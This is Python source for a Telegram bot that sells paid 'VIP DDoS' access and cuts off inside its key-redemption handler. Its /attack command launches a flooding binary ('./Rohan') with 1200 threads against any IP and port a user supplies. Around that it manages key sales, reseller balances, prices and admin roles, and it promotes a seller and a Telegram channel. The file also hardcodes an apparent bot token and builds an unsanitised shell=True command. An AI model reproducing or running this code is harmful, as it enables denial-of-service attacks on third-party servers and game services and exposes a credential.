import os
import json
import time
import telebot
import datetime
import subprocess
import threading
import socket
from dateutil.relativedelta import relativedelta
import pytz
import shutil
import signal
from telebot import formatting
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# Set Indian Standard Time (IST) timezone
IST = pytz.timezone('Asia/Kolkata')

# Telegram bot token
bot = telebot.TeleBot('8147615549:AAHPEsEc5oMCJcS_NDvjgo1L65fvv21vqrc')

# Configure retries for Telegram API requests
session = requests.Session()
retries = Retry(total=5, backoff_factor=1, status_forcelist=[429, 500, 502, 503, 504])
session.mount('https://', HTTPAdapter(max_retries=retries))
bot.session = session  # Attach the session with retries to the bot

# Overlord IDs and usernames (fixed)
overlord_id = {"1807014348", "6258297180"}
overlord_usernames = {"@sadiq9869", "@rahul_618"}

# Dynamic admin IDs and usernames (loaded from file)
admin_id = set()
admin_usernames = set()

# Files and backup directory
DATA_DIR = "data"
BACKUP_DIR = os.path.join(DATA_DIR, "backups")
USER_FILE = os.path.join(DATA_DIR, "users.json")
KEY_FILE = os.path.join(DATA_DIR, "keys.json")
RESELLERS_FILE = os.path.join(DATA_DIR, "resellers.json")
AUTHORIZED_USERS_FILE = os.path.join(DATA_DIR, "authorized_users.json")
LOG_FILE = os.path.join(DATA_DIR, "log.txt")
BLOCK_ERROR_LOG = os.path.join(DATA_DIR, "block_error_log.txt")
COOLDOWN_FILE = os.path.join(DATA_DIR, "cooldown.json")
ADMIN_FILE = os.path.join(DATA_DIR, "admins.json")
MAX_BACKUPS = 5

# Per key cost for resellers
KEY_COST = {"1min": 5, "1h": 10, "1d": 100, "7d": 450, "1m": 900}

# In-memory storage
users = {}  # Stores user_id: {expiration, context}
keys = {}   # Stores key: {duration, device_limit, devices, blocked, context}
authorized_users = {}
last_attack_time = {}
active_attacks = {}
COOLDOWN_PERIOD = 0  # Cooldown removed as per March 05, 2025
resellers = {}

# Compulsory message with enhanced UI
COMPULSORY_MESSAGE = (
    "━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    "🔥 **SCAM ALERT!** 🔥\n"
    "Agar koi bhi Rahul DDoS bot ka key **kisi aur se** kharidta hai, toh kisi bhi scam ka **koi responsibility nahi**! 😡\n"
    "✅ **Sirf @Rahul_618** se key lo – yeh hai **Trusted Dealer**! 💎\n"
    "━━━━━━━━━━━━━━━━━━━━━━━━━"
)

# Initialize directory and files
def initialize_system():
    if not os.path.exists(DATA_DIR):
        os.makedirs(DATA_DIR)
    if not os.path.exists(BACKUP_DIR):
        os.makedirs(BACKUP_DIR)
    for file in [USER_FILE, KEY_FILE, RESELLERS_FILE, AUTHORIZED_USERS_FILE, LOG_FILE, BLOCK_ERROR_LOG, COOLDOWN_FILE, ADMIN_FILE]:
        if not os.path.exists(file):
            if file.endswith(".json"):
                with open(file, 'w', encoding='utf-8') as f:
                    if file == COOLDOWN_FILE:
                        json.dump({"cooldown": 0}, f)
                    elif file == ADMIN_FILE:
                        json.dump({"ids": [], "usernames": []}, f)
                    else:
                        json.dump({}, f)
            else:
                open(file, 'a').close()

# Reset a JSON file to its default state if corrupted
def reset_json_file(file_path, default_data):
    with open(file_path, 'w', encoding='utf-8') as f:
        json.dump(default_data, f, indent=4)
    log_action("SYSTEM", "SYSTEM", "Reset JSON File", f"File: {file_path}, Reset to: {default_data}", "File reset due to corruption")

# Load and validate data with expire check
def load_data():
    global users, keys, authorized_users, resellers, admin_id, admin_usernames
    initialize_system()
    max_retries = 3
    retry_count = 0

    while retry_count < max_retries:
        try:
            # Load users and authorized users
            for file in [USER_FILE, AUTHORIZED_USERS_FILE]:
                with open(file, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    if not isinstance(data, dict):
                        log_action("SYSTEM", "SYSTEM", "Load Data Error", f"File: {file}, Invalid data type: {type(data)}", "Resetting file")
                        reset_json_file(file, {})
                        data = {}
                    for uid, info in list(data.items()):
                        try:
                            exp_date = datetime.datetime.strptime(info['expiration'], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
                            if datetime.datetime.now(IST) > exp_date:
                                del data[uid]
                            else:
                                data[uid] = info
                        except (ValueError, KeyError):
                            del data[uid]
                    if file == USER_FILE:
                        users = data
                    else:
                        authorized_users = data

            # Load keys
            with open(KEY_FILE, 'r', encoding='utf-8') as f:
                keys_data = json.load(f)
                if not isinstance(keys_data, dict):
                    log_action("SYSTEM", "SYSTEM", "Load Data Error", f"File: {KEY_FILE}, Invalid data type: {type(keys_data)}", "Resetting file")
                    reset_json_file(KEY_FILE, {})
                    keys_data = {}
                for key_name, key_info in list(keys_data.items()):
                    generated_time = datetime.datetime.strptime(key_info["generated_time"], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
                    minutes, hours, days, months = parse_duration(key_info["duration"])
                    expiration_time = generated_time + relativedelta(months=months, days=days, hours=hours, minutes=minutes)
                    if datetime.datetime.now(IST) > expiration_time and not key_info.get("blocked", False):
                        del keys_data[key_name]
                    else:
                        keys_data[key_name] = key_info
                keys = keys_data

            # Load resellers
            with open(RESELLERS_FILE, 'r', encoding='utf-8') as f:
                resellers_data = json.load(f)
                if not isinstance(resellers_data, dict):
                    log_action("SYSTEM", "SYSTEM", "Load Data Error", f"File: {RESELLERS_FILE}, Invalid data type: {type(resellers_data)}", "Resetting file")
                    reset_json_file(RESELLERS_FILE, {})
                    resellers_data = {}
                resellers = resellers_data

            # Load cooldown
            with open(COOLDOWN_FILE, 'r', encoding='utf-8') as f:
                cooldown_data = json.load(f)
                if not isinstance(cooldown_data, dict) or "cooldown" not in cooldown_data:
                    log_action("SYSTEM", "SYSTEM", "Load Data Error", f"File: {COOLDOWN_FILE}, Invalid data: {cooldown_data}", "Resetting file")
                    reset_json_file(COOLDOWN_FILE, {"cooldown": 0})
                    cooldown_data = {"cooldown": 0}
                COOLDOWN_PERIOD = cooldown_data.get("cooldown", 0)

            # Load admins
            with open(ADMIN_FILE, 'r', encoding='utf-8') as f:
                admin_data = json.load(f)
                if not isinstance(admin_data, dict) or "ids" not in admin_data or "usernames" not in admin_data:
                    log_action("SYSTEM", "SYSTEM", "Load Data Error", f"File: {ADMIN_FILE}, Invalid data: {admin_data}", "Resetting file")
                    reset_json_file(ADMIN_FILE, {"ids": [], "usernames": []})
                    admin_data = {"ids": [], "usernames": []}
                admin_id = set(admin_data.get("ids", []))
                admin_usernames = set(admin_data.get("usernames", []))

            print(f"Data loaded successfully. Keys: {list(keys.keys())}, Admins: {admin_id}")
            break

        except (FileNotFoundError, json.JSONDecodeError) as e:
            retry_count += 1
            log_action("SYSTEM", "SYSTEM", "Load Data Error", f"Error: {str(e)}, Retry: {retry_count}/{max_retries}", "Attempting to restore from backup")
            print(f"Corruption detected in {e}, attempting to restore from backup (Retry {retry_count}/{max_retries}).")
            restore_from_backup()

            if retry_count == max_retries:
                log_action("SYSTEM", "SYSTEM", "Load Data Failure", f"Error: {str(e)}, Max retries reached", "Resetting all files to default")
                reset_json_file(USER_FILE, {})
                reset_json_file(AUTHORIZED_USERS_FILE, {})
                reset_json_file(KEY_FILE, {})
                reset_json_file(RESELLERS_FILE, {})
                reset_json_file(COOLDOWN_FILE, {"cooldown": 0})
                reset_json_file(ADMIN_FILE, {"ids": [], "usernames": []})
                users = {}
                authorized_users = {}
                keys = {}
                resellers = {}
                COOLDOWN_PERIOD = 0
                admin_id = set()
                admin_usernames = set()
                print("Max retries reached, reset all data to default.")
                break

def save_data():
    with open(USER_FILE, 'w', encoding='utf-8') as f:
        json.dump(users, f, indent=4)
    with open(AUTHORIZED_USERS_FILE, 'w', encoding='utf-8') as f:
        json.dump(authorized_users, f, indent=4)
    with open(KEY_FILE, 'w', encoding='utf-8') as f:
        json.dump(keys, f, indent=4)
    with open(RESELLERS_FILE, 'w', encoding='utf-8') as f:
        json.dump(resellers, f, indent=4)
    with open(COOLDOWN_FILE, 'w', encoding='utf-8') as f:
        json.dump({"cooldown": COOLDOWN_PERIOD}, f, indent=4)
    with open(ADMIN_FILE, 'w', encoding='utf-8') as f:
        json.dump({"ids": list(admin_id), "usernames": list(admin_usernames)}, f, indent=4)
    print("All data saved successfully.")

def create_backup():
    backup_time = datetime.datetime.now(IST).strftime('%Y-%m-%d_%I-%M-%S_%p')
    backup_dir = os.path.join(BACKUP_DIR, f"backup_{backup_time}")
    os.makedirs(backup_dir)
    for file in [USER_FILE, KEY_FILE, RESELLERS_FILE, AUTHORIZED_USERS_FILE, COOLDOWN_FILE, LOG_FILE, BLOCK_ERROR_LOG, ADMIN_FILE]:
        shutil.copy2(file, os.path.join(backup_dir, os.path.basename(file)))
    backups = [d for d in os.listdir(BACKUP_DIR) if d.startswith("backup_")]
    if len(backups) > MAX_BACKUPS:
        oldest_backup = min(backups, key=lambda x: os.path.getctime(os.path.join(BACKUP_DIR, x)))
        shutil.rmtree(os.path.join(BACKUP_DIR, oldest_backup))

def restore_from_backup():
    backups = [d for d in os.listdir(BACKUP_DIR) if d.startswith("backup_")]
    if backups:
        latest_backup = max(backups, key=lambda x: os.path.getctime(os.path.join(BACKUP_DIR, x)))
        backup_path = os.path.join(BACKUP_DIR, latest_backup)
        for file in [USER_FILE, KEY_FILE, RESELLERS_FILE, AUTHORIZED_USERS_FILE, COOLDOWN_FILE, LOG_FILE, BLOCK_ERROR_LOG, ADMIN_FILE]:
            src = os.path.join(backup_path, os.path.basename(file))
            if os.path.exists(src):
                shutil.copy2(src, file)
        log_action("SYSTEM", "SYSTEM", "Restore Backup", f"Restored from: {backup_path}", "Backup restored successfully")
    else:
        log_action("SYSTEM", "SYSTEM", "Restore Backup", "No backups found", "Failed to restore, no backups available")

def is_overlord(user_id, username=None):
    username = username.lower() if username else None
    return (str(user_id) in overlord_id or username in overlord_usernames)

def is_admin(user_id, username=None):
    username = username.lower() if username else None
    return (str(user_id) in admin_id or username in admin_usernames or is_overlord(user_id, username))

def has_valid_context(user_id, chat_type):
    if user_id in users:
        try:
            user_info = users[user_id]
            exp_date = datetime.datetime.strptime(user_info['expiration'], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
            if datetime.datetime.now(IST) < exp_date:
                return user_info.get('context') == chat_type
        except (ValueError, KeyError):
            return False
    return False

def append_compulsory_message(response):
    """Append the compulsory message to the response."""
    return f"{response}\n\n{COMPULSORY_MESSAGE}"

def safe_reply(bot, message, text):
    try:
        text_with_compulsory = append_compulsory_message(text)
        bot.send_message(message.chat.id, text_with_compulsory, parse_mode="MarkdownV2")
    except telebot.apihelper.ApiTelegramException as e:
        if "message to be replied not found" in str(e):
            with open("error_log.txt", "a") as log_file:
                log_file.write(f"[{datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}] Message not found: chat_id={message.chat.id}, message_id={message.message_id}, user_id={message.from_user.id}, text={text}\n")
            text_with_compulsory = append_compulsory_message(text)
            bot.send_message(message.chat.id, text_with_compulsory, parse_mode="MarkdownV2")
        else:
            log_error(f"Error in safe_reply: {str(e)}", message.from_user.id, message.from_user.username)
            raise e

def log_action(user_id, username, command, details="", response="", error=""):
    username = username or f"UserID_{user_id}"
    timestamp = datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')
    log_entry = (
        f"Timestamp: {timestamp}\n"
        f"UserID: {user_id}\n"
        f"Username: @{username}\n"
        f"Command: {command}\n"
        f"Details: {details}\n"
        f"Response: {response}\n"
    )
    if error:
        log_entry += f"Error: {error}\n"
    log_entry += "----------------------------------------\n"
    with open(LOG_FILE, "a", encoding='utf-8') as file:
        file.write(log_entry)

def log_error(error_message, user_id, username):
    username = username or f"UserID_{user_id}"
    timestamp = datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')
    log_entry = (
        f"Timestamp: {timestamp}\n"
        f"UserID: {user_id}\n"
        f"Username: @{username}\n"
        f"Error: {error_message}\n"
        "----------------------------------------\n"
    )
    with open(LOG_FILE, "a", encoding='utf-8') as file:
        file.write(log_entry)

def set_cooldown(seconds):
    global COOLDOWN_PERIOD
    COOLDOWN_PERIOD = seconds
    with open(COOLDOWN_FILE, "w") as file:
        json.dump({"cooldown": seconds}, file)

def load_cooldown():
    global COOLDOWN_PERIOD
    try:
        with open(COOLDOWN_FILE, "r") as file:
            data = json.load(file)
            COOLDOWN_PERIOD = data.get("cooldown", 0)
    except FileNotFoundError:
        COOLDOWN_PERIOD = 0

def parse_duration(duration_str):
    duration_str = duration_str.lower().replace("minutes", "min").replace("hours", "h").replace("days", "d").replace("months", "m")
    import re
    match = re.match(r"(\d+)([minhdm])", duration_str)
    if not match:
        return None, None, None, None
    value = int(match.group(1))
    unit = match.group(2)
    if unit == "min":
        if value < 1 or value > 59:
            return None, None, None, None
        return value, 0, 0, 0
    elif unit == "h":
        return 0, value, 0, 0
    elif unit == "d":
        return 0, 0, value, 0
    elif unit == "m":
        return 0, 0, 0, value
    return None, None, None, None

def add_time_to_current_date(years=0, months=0, days=0, hours=0, minutes=0, seconds=0):
    current_time = datetime.datetime.now(IST)
    new_time = current_time + relativedelta(years=years, months=months, days=days, hours=hours, minutes=minutes, seconds=seconds)
    return new_time

def execute_attack(target, port, time, chat_id, username, last_attack_time, user_id):
    if active_attacks.get(user_id, False):
        response = "🚫 BSDK, ruk ja warna gaand mar dunga teri! Ek attack chal raha hai, dusra mat try kar!" if not is_admin(user_id, username) else "👑 Kripya karke BGMI ko tazi sa na choda! Ek attack already chal raha hai, wait karo."
        safe_reply(bot, chat_id, response)
        log_action(user_id, username, "/attack", f"Target: {target}, Port: {port}, Time: {time}", response)
        return
    try:
        packet_size = 512
        if packet_size < 1 or packet_size > 65507:
            response = "Error: Packet size must be between 1 and 65507"
            bot.send_message(chat_id, response)
            log_action(user_id, username, "/attack", f"Target: {target}, Port: {port}, Time: {time}", response)
            return
        full_command = f"./Rohan {target} {port} {time} {packet_size} 1200"
        response = f"Attack Sent Successfully\nTarget: {target}:{port}\nTime: {time} seconds\nPacket Size: {packet_size} bytes\nThreads: 1200\nAttacker: @{username}\nJoin VIP DDoS: https://t.me/devil_ddos"
        bot.send_message(chat_id, formatting.escape_markdown(response), parse_mode='MarkdownV2')
        subprocess.Popen(full_command, shell=True)
        threading.Timer(time, lambda: send_attack_finished_message(chat_id), []).start()
        last_attack_time[user_id] = datetime.datetime.now(IST)
        active_attacks[user_id] = True
        log_action(user_id, username, "/attack", f"Target: {target}, Port: {port}, Time: {time}, Packet Size: {packet_size}, Threads: 1200", response)
    except Exception as e:
        response = f"Error executing attack: {str(e)}"
        bot.send_message(chat_id, response)
        log_action(user_id, username, "/attack", f"Target: {target}, Port: {port}, Time: {time}", response, str(e))
    finally:
        if user_id in active_attacks:
            del active_attacks[user_id]

def send_attack_finished_message(chat_id):
    bot.send_message(chat_id, "Attack completed")

@bot.message_handler(commands=['addadmin'])
def add_admin(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    command = message.text
    if not is_overlord(user_id, username):
        response = "Bhai, ye sirf Overlord ka kaam hai!"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/addadmin", f"Command: {command}", response)
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        response = "Usage: /addadmin <username_or_id>\nExample: /addadmin @user123 ya /addadmin 123456789"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/addadmin", f"Command: {command}", response)
        return
    target = command_parts[1]
    if target.startswith('@'):
        target_username = target.lower()
        if target_username in overlord_usernames:
            response = "Overlord ko admin banane ki zarurat nahi, woh toh pehle se hi hai!"
            safe_reply(bot, message, response)
            log_action(user_id, username, "/addadmin", f"Target: {target}", response)
            return
        if target_username in admin_usernames:
            response = f"{target} pehle se hi admin hai!"
            safe_reply(bot, message, response)
            log_action(user_id, username, "/addadmin", f"Target: {target}", response)
            return
        admin_usernames.add(target_username)
        response = f"Admin add ho gaya!\nUsername: {target}"
    else:
        try:
            target_id = str(int(target))
            if target_id in overlord_id:
                response = "Overlord ko admin banane ki zarurat nahi, woh toh pehle se hi hai!"
                safe_reply(bot, message, response)
                log_action(user_id, username, "/addadmin", f"Target: {target}", response)
                return
            if target_id in admin_id:
                response = f"User ID {target_id} pehle se hi admin hai!"
                safe_reply(bot, message, response)
                log_action(user_id, username, "/addadmin", f"Target: {target}", response)
                return
            admin_id.add(target_id)
            response = f"Admin add ho gaya!\nUser ID: {target_id}"
        except ValueError:
            response = "Invalid ID ya username! Username @ se start hona chahiye ya ID number hona chahiye."
            safe_reply(bot, message, response)
            log_action(user_id, username, "/addadmin", f"Target: {target}", response)
            return
    save_data()
    safe_reply(bot, message, response)
    log_action(user_id, username, "/addadmin", f"Target: {target}", response)

@bot.message_handler(commands=['removeadmin'])
def remove_admin(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    command = message.text
    if not is_overlord(user_id, username):
        response = "Bhai, ye sirf Overlord ka kaam hai!"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/removeadmin", f"Command: {command}", response)
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        response = "Usage: /removeadmin <username_or_id>\nExample: /removeadmin @user123 ya /removeadmin 123456789"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/removeadmin", f"Command: {command}", response)
        return
    target = command_parts[1]
    if target.startswith('@'):
        target_username = target.lower()
        if target_username in overlord_usernames:
            response = "Overlord ko remove nahi kar sakte!"
            safe_reply(bot, message, response)
            log_action(user_id, username, "/removeadmin", f"Target: {target}", response)
            return
        if target_username not in admin_usernames:
            response = f"{target} admin nahi hai!"
            safe_reply(bot, message, response)
            log_action(user_id, username, "/removeadmin", f"Target: {target}", response)
            return
        admin_usernames.remove(target_username)
        response = f"Admin remove ho gaya!\nUsername: {target}"
    else:
        try:
            target_id = str(int(target))
            if target_id in overlord_id:
                response = "Overlord ko remove nahi kar sakte!"
                safe_reply(bot, message, response)
                log_action(user_id, username, "/removeadmin", f"Target: {target}", response)
                return
            if target_id not in admin_id:
                response = f"User ID {target_id} admin nahi hai!"
                safe_reply(bot, message, response)
                log_action(user_id, username, "/removeadmin", f"Target: {target}", response)
                return
            admin_id.remove(target_id)
            response = f"Admin remove ho gaya!\nUser ID: {target_id}"
        except ValueError:
            response = "Invalid ID ya username! Username @ se start hona chahiye ya ID number hona chahiye."
            safe_reply(bot, message, response)
            log_action(user_id, username, "/removeadmin", f"Target: {target}", response)
            return
    save_data()
    safe_reply(bot, message, response)
    log_action(user_id, username, "/removeadmin", f"Target: {target}", response)

@bot.message_handler(commands=['checkadmin'])
def check_admin(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    command = message.text
    response = "=== ADMIN LIST BHAI ===\n"
    
    # Overlords
    response += "\n**Overlords**:\n"
    for oid in overlord_id:
        try:
            user_info = bot.get_chat(oid)
            user_name = user_info.username if user_info.username else user_info.first_name
            response += f"User ID: {oid}\nUsername: @{user_name}\nRole: Overlord\n\n"
        except:
            response += f"User ID: {oid}\nUsername: Unknown\nRole: Overlord\n\n"
    for uname in overlord_usernames:
        response += f"Username: {uname}\nUser ID: Unknown\nRole: Overlord\n\n"
    
    # Admins
    response += "\n**Admins**:\n"
    if not admin_id and not admin_usernames:
        response += "No additional admins found.\n"
    else:
        for aid in admin_id:
            if aid not in overlord_id:  # Skip overlords
                try:
                    user_info = bot.get_chat(aid)
                    user_name = user_info.username if user_info.username else user_info.first_name
                    response += f"User ID: {aid}\nUsername: @{user_name}\nRole: Admin\n\n"
                except:
                    response += f"User ID: {aid}\nUsername: Unknown\nRole: Admin\n\n"
        for uname in admin_usernames:
            if uname not in overlord_usernames:  # Skip overlords
                response += f"Username: {uname}\nUser ID: Unknown\nRole: Admin\n\n"
    
    response += "Buy key from @Rahul_618\nAny problem contact @Rahul_618"
    safe_reply(bot, message, response)
    log_action(user_id, username, "/checkadmin", "", response)

@bot.message_handler(commands=['addreseller'])
def add_reseller(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    command = message.text
    if user_id not in admin_id and not is_overlord(user_id, username):
        response = "Access Denied: Admin only command"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/addreseller", f"Command: {command}", response)
        return
    command_parts = message.text.split()
    if len(command_parts) != 3:
        response = "Usage: /addreseller <user_id> <balance>"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/addreseller", f"Command: {command}", response)
        return
    reseller_id = command_parts[1]
    try:
        initial_balance = int(command_parts[2])
    except ValueError:
        response = "Invalid balance amount"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/addreseller", f"Command: {command}", response)
        return
    if reseller_id not in resellers:
        resellers[reseller_id] = initial_balance
        save_data()
        response = f"Reseller added successfully\nReseller ID: {reseller_id}\nBalance: {initial_balance} Rs"
    else:
        response = f"Reseller {reseller_id} already exists"
    safe_reply(bot, message, response)
    log_action(user_id, username, "/addreseller", f"Reseller ID: {reseller_id}, Balance: {initial_balance}", response)
    save_data()

@bot.message_handler(commands=['genkey'])
def generate_key(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    command = message.text
    if not is_admin(user_id, username):
        response = "Bhai, admin hi key bana sakta hai!"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/genkey", f"Command: {command}", response)
        return
    command_parts = message.text.split()
    
    # Check if the user is an Overlord
    if is_overlord(user_id, username):
        if len(command_parts) < 4 or len(command_parts) > 5:
            response = "Usage for Overlord: /genkey <duration> [device_limit] <key_name> <context>\nExample: /genkey 1d 999 sadiq group or /genkey 1d all sadiq DM"
            safe_reply(bot, message, response)
            log_action(user_id, username, "/genkey", f"Command: {command}", response)
            return
        # Parse the command for Overlord
        duration = command_parts[1].lower()
        if len(command_parts) == 5:
            device_limit_input = command_parts[2].lower()
            key_name = command_parts[3]
            context = command_parts[4].lower()
        else:
            device_limit_input = "1"  # Default to 1 if not specified
            key_name = command_parts[2]
            context = command_parts[3].lower()
        
        # Parse device limit
        if device_limit_input == "all":
            device_limit = float('inf')  # Unlimited devices
        else:
            try:
                device_limit = int(device_limit_input)
                if device_limit < 1:
                    response = "Device limit must be at least 1!"
                    safe_reply(bot, message, response)
                    log_action(user_id, username, "/genkey", f"Command: {command}", response)
                    return
            except ValueError:
                response = "Invalid device limit! Use a number or 'all'."
                safe_reply(bot, message, response)
                log_action(user_id, username, "/genkey", f"Command: {command}", response)
                return
    else:
        # Non-Overlord (Admins and Resellers) format
        if len(command_parts) != 4 or command_parts[1].lower() != "key":
            response = "Usage for Admins/Resellers: /genkey key <duration> <key_name>\nExample: /genkey key 1d rahul\nNote: Only group keys can be generated."
            safe_reply(bot, message, response)
            log_action(user_id, username, "/genkey", f"Command: {command}", response)
            return
        duration = command_parts[2].lower()
        key_name = command_parts[3]
        context = "group"  # Fixed to group for Admins/Resellers
        device_limit = 1  # Default device limit for non-Overlords

    # Validate context for Overlord
    if is_overlord(user_id, username):
        if context not in ['dm', 'group', 'groups']:
            response = "Invalid context! Use 'dm', 'group', or 'groups' (case-insensitive)."
            safe_reply(bot, message, response)
            log_action(user_id, username, "/genkey", f"Command: {command}", response)
            return
        context = 'group' if context in ['group', 'groups'] else 'private'

    # Parse duration
    minutes, hours, days, months = parse_duration(duration)
    if minutes is None and hours is None and days is None and months is None:
        response = "Invalid duration. Use formats like 30min, 1h, 1d, 1m"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/genkey", f"Command: {command}", response)
        return

    cost_duration = duration
    if minutes > 0:
        cost_duration = "1min"
    elif hours >= 24:
        days = hours // 24
        hours = 0
        duration = f"{days}d"
        cost_duration = duration
    elif days >= 30:
        months = days // 30
        days = 0
        duration = f"{months}m"
        cost_duration = duration
    elif months > 0:
        cost_duration = "1m" if months == 1 else f"{months}m"
    elif days > 0:
        cost_duration = "1d" if days == 1 else f"{days}d"
    elif hours > 0:
        cost_duration = "1h" if hours == 1 else f"{hours}h"

    custom_key = f"Rahul_sadiq-{key_name}"
    generated_by = username or f"UserID_{user_id}"
    # If key exists, update it and unblock if previously blocked
    if custom_key in keys:
        was_blocked = keys[custom_key].get("blocked", False)
        keys[custom_key] = {
            "duration": duration,
            "device_limit": device_limit,
            "devices": keys[custom_key].get("devices", []),
            "blocked": False,  # Unblock the key
            "blocked_by_username": "",
            "blocked_time": "",
            "generated_time": datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p'),
            "generated_by": generated_by,
            "context": context
        }
        action = "updated"
        if was_blocked:
            log_action(user_id, username, "/genkey", f"Key: {custom_key}", f"Unblocked key {custom_key} during regeneration")
    else:
        keys[custom_key] = {
            "duration": duration,
            "device_limit": device_limit,
            "devices": [],
            "blocked": False,
            "blocked_by_username": "",
            "blocked_time": "",
            "generated_time": datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p'),
            "generated_by": generated_by,
            "context": context
        }
        action = "generated"

    save_data()

    for uid in keys[custom_key]["devices"]:
        if uid in users:
            expiration_time = add_time_to_current_date(months=months, days=days, hours=hours, minutes=minutes)
            users[uid] = {"expiration": expiration_time.strftime('%Y-%m-%d %I:%M:%S %p'), "context": context}
    save_data()

    device_limit_display = "Unlimited" if device_limit == float('inf') else device_limit
    response = f"Key {action} successfully\n`Key: {custom_key}`\nDuration: {duration}\nDevice Limit: {device_limit_display}\nContext: {context.capitalize()}\nGenerated by: @{generated_by}\nGenerated on: {keys[custom_key]['generated_time']}"
    if user_id in resellers:
        cost = KEY_COST.get(cost_duration, 0)
        if cost > 0:
            resellers[user_id] -= cost
            save_data()
            response += f"\nCost: {cost} Rs\nRemaining balance: {resellers[user_id]} Rs"
    safe_reply(bot, message, response)
    log_action(user_id, username, "/genkey", f"Key: {custom_key}, Duration: {duration}, Device Limit: {device_limit_display}, Context: {context}, Generated by: @{generated_by}", response)

@bot.message_handler(commands=['help'])
def help_command(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    command = message.text
    help_text = """
VIP DDOS HELP GUIDE
BOT CONTROLS:
- /start - Start the bot
- /myinfo - Check full information about yourself
- /help - Show this guide
- /checkadmin - Check all admins and overlords
POWER MANAGEMENT:
- /attack <ip> <port> <time> - Launch an attack (admin and authorized users only, requires valid group/private key)
- /setcooldown <seconds> - Set the attack cooldown period (admin only)
- /checkcooldown - Check the current cooldown period
- /addreseller <user_id> <balance> - Add a new reseller (admin only)
- /genkey - Generate a key
  - For Overlords: /genkey <duration> [device_limit] <key_name> <context> (e.g., /genkey 1d 999 sadiq group or /genkey 1d all sadiq DM)
  - For Admins/Resellers: /genkey key <duration> <key_name> (e.g., /genkey key 1d rahul) [Only group keys]
  - Context (Overlords only): dm, DM, group, Group, groups, Groups (case-insensitive)
- /logs - View recent logs (Overlord only)
- /users - List authorized users (admin only)
- /add <user_id> - Add user ID for access without a key (admin only)
- /remove <user_id> - Remove a user (admin only)
- /resellers - View resellers
- /addbalance <reseller_id> <amount> - Add balance to a reseller (admin only)
- /removereseller <reseller_id> - Remove a reseller (admin only)
- /block <key_name> - Block a key and remove associated users (admin only)
- /addadmin <username_or_id> - Add an admin (Overlord only)
- /removeadmin <username_or_id> - Remove an admin (Overlord only)
- /redeem <key_name> - Redeem your key (e.g., /redeem Rahul_sadiq-rahul)
- /balance - Check your reseller balance (resellers only)
- /listkeys - List all keys with detailed info (admin only)
EXAMPLE:
- /genkey 1d all sadiq group - Generate a group key with unlimited devices (Overlord only)
- /genkey 1d 999 sadiq DM - Generate a private key with 999 device limit (Overlord only)
- /genkey key 1d rahul - Generate a 1-day group key (Admins/Resellers)
- /attack 192.168.1.1 80 120 - Launch an attack (if authorized with valid key)
- /setcooldown 120 - Set cooldown to 120 seconds (admin only)
- /checkcooldown - View current cooldown
- /redeem Rahul_sadiq-rahul - Redeem your key (group or private)
- /listkeys - View all keys with details (admin only)
Buy key from @Rahul_618
Any problem contact @Rahul_618
Join VIP DDoS channel: https://t.me/devil_ddos
"""
    safe_reply(bot, message, help_text)
    log_action(user_id, username, "/help", "", help_text)
    save_data()

@bot.message_handler(commands=['balance'])
def check_balance(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    command = message.text
    if user_id in resellers:
        current_balance = resellers[user_id]
        response = f"Your current balance is: {current_balance} Rs"
    else:
        response = "Access Denied: Reseller only command"
    safe_reply(bot, message, response)
    log_action(user_id, username, "/balance", "", response)
    save_data()

@bot.message_handler(commands=['redeem'])
def redeem_key(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    command = message.text
    chat_type = 'group' if message.chat.type in ['group', 'supergroup'] else 'private'
    
    if is_admin(user_id, username):
        response = "Bhai, admin ko key ki zarurat nahi!"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/redeem", f"Command: {command}", response)
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        response = "Usage: /redeem <key_name>\nExample: /redeem Rahul_sadiq-rahul"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/redeem", f"Command: {command}", response)
        return
    key = command_parts[1].strip()
    if user_id in users:
        try:
            user_info = users[user_id]
            expiration_date = datetime.datetime.strptime(user_info['expiration'], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
            if datetime.datetime.now(IST) < expiration_date:
                response = f"You already have an active key!\nContext: {user_info['context'].capitalize()}\nExpires on: {expiration_date.strftime('%Y-%m-%d %I:%M:%S %p')}\nPlease wait until it expires to redeem a new key."
                safe_reply(bot, message, response)
                log_action(user_id, username, "/redeem", f"Key: {key}", response)
                return
            else:
                del users[user_id]
                save_data()
                log_action(user_id, username, "/redeem", f"Removed expired user access for UserID: {user_id}", "User access removed due to expiration")
        except (ValueError, KeyError):
            response = "Error: Invalid user data. Contact @Rahul_618"
            safe_reply(bot, message, response)
            log_action(user_id, username, "/redeem", f"Key: {key}", response, "Invalid user data")
            return
    if key in keys:
        if keys[key].get("blocked", False):
            response = "This key has been blocked. Contact @Rahul_618"
            safe_reply(bot, message, response)
